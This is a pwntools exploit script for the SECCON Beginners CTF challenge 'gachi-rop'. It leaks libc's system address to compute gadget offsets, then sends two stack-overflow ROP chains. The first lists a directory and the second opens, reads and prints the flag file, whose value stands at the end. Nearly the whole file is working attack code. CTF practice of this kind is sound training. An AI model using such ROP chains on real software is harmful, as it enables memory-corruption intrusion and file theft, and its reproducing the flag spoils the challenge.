from pwn import *

# Exploit configs
binary = ELF('chall_patched')
host = 'gachi-rop.beginners.seccon.games'
port = 4567
#local_libc = ELF('./libc-x.xx.so', checksec=False)
#remote_libc = ELF('./libc-x.xx.so', checksec=False)
#ld = ELF('./ld-x.xx.so', checksec=False)

#call GDB
##############################################################################################
def launch_gdb(breakpoints=[], cmds=[]):
    if args.GDB:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(binary.address + b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
    else:
        return
##############################################################################################

# call with DEBUG to change log level
# call with GDB to attach gdb
# call with REMOTE to run against live target
if args.REMOTE:
    args.GDB = False # disable gdb when working remote
    io = remote(host, port)
#   libc = remote_libc
else:
#   io = process([ld.path, binary.path], env={'LD_PRELOAD': remote_libc.path})
    io = process(binary.path)
#   libc = remote_libc
if not args.REMOTE:
    for mmap in open('/proc/{}/maps'.format(io.pid),"rb").readlines():
        mmap = mmap.decode()
        if binary.path.split('/')[-1] == mmap.split('/')[-1][:-1]:
            binary.address = int(mmap.split('-')[0],16)
            break
c = [
'file chall',
'info registers',
]
b = [0x227b, 0x229b]
launch_gdb(breakpoints=b, cmds=c)

def mov_rax_rsi():
    tmp = p64(pop_rdi) + p64(buf_addr) + p64(libc_base + 0x03d1ee) + p64(0) + p64(libc_base + 0x01744c2)
    return tmp
def mov_rsi_rdi():
    tmp = p64(pop_rdi) + p64(0) + p64(libc_base + 0x01b50f6)
    return tmp

system_off = 0x050d70
open_off = 0x01144e0
read_off = 0x01147d0
write_off = 0x0114870
stat_off = 0x0113cb0
opendir_off = 0x0e6280
readdir_off = 0x0e6680
mmap_off = 0x011ea10
buf_addr = 0x404100

pop_rdi_off = 0x02a3e5
pop_rsi_off = 0x02be51
pop_rdx_r12_off = 0x011f2e7
pop_rcx_off = 0x03d1ee
pop_r8_off = 0x01659e6
push_rax_off = 0x041563
pop_rdi_off = 0x02a3e5
add_rdi_rsi_off = 0x0b513c
push_rdi_off = 0x0b4b18
pop_rbp_off = 0x02a2e0

io.recvuntil(b'system@')
system_addr = io.recvline()[:-1].decode()
system_addr = int(system_addr, 16)
print(hex(system_addr))
libc_base = system_addr - system_off

open_addr = libc_base + open_off
read_addr = libc_base + read_off
write_addr = libc_base + write_off
stat_addr = libc_base + stat_off
opendir_addr = libc_base + opendir_off
readdir_addr = libc_base + readdir_off
mmap_addr = libc_base + mmap_off

pop_rdi = libc_base + pop_rdi_off
pop_rsi = libc_base + pop_rsi_off
pop_rdx_r12 = libc_base + pop_rdx_r12_off
pop_rcx = libc_base + pop_rcx_off
pop_r8 = libc_base + pop_r8_off
push_rax = libc_base + push_rax_off
pop_rbp = libc_base + pop_rbp_off
add_rdi_rsi = libc_base + add_rdi_rsi_off
push_rdi = libc_base + push_rdi_off
ret_addr = 0x40101a

dir_path = b'../app/ctf4b/\x00'
flag_file = b'flag-40ff81b29993c8fc02dbf404eddaf143.txt'

p = b'a'*24
p += p64(pop_rdi) + p64(0x00) + p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx_r12) + p64(len(dir_path)) + p64(0x00) + p64(read_addr)
p += p64(pop_rdi) + p64(buf_addr) + p64(ret_addr) + p64(opendir_addr) + mov_rax_rsi()
p += mov_rsi_rdi() +  p64(pop_rbp) + p64(buf_addr) + p64(readdir_addr)
p += mov_rax_rsi() + p64(pop_rdi) + p64(1) + p64(pop_rdx_r12) + p64(0x1000) + p64(0) + p64(write_addr)
p += p64(ret_addr) + p64(0x40121b)
io.sendline(p)
io.send(dir_path)

full_path = dir_path[:-1] + flag_file + b'\x00'

p = b'a'*24
p += p64(pop_rdi) + p64(0x00) + p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx_r12) + p64(len(full_path)) + p64(0x00) + p64(read_addr)
p += p64(pop_rdi) + p64(buf_addr) + p64(ret_addr) + p64(pop_rsi) + p64(0x00) + p64(open_addr) + mov_rax_rsi()
p += mov_rsi_rdi() +  p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx_r12) + p64(0x30) + p64(0x00) + p64(read_addr)
p += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx_r12) + p64(0x100) + p64(0x00) + p64(write_addr)
p += p64(ret_addr) + p64(0x40121b)
io.sendline(p)
io.send(full_path)

io.interactive()

#ctf4b{64ch1_r0p_r3qu1r35_mu5cl3_3h3h3}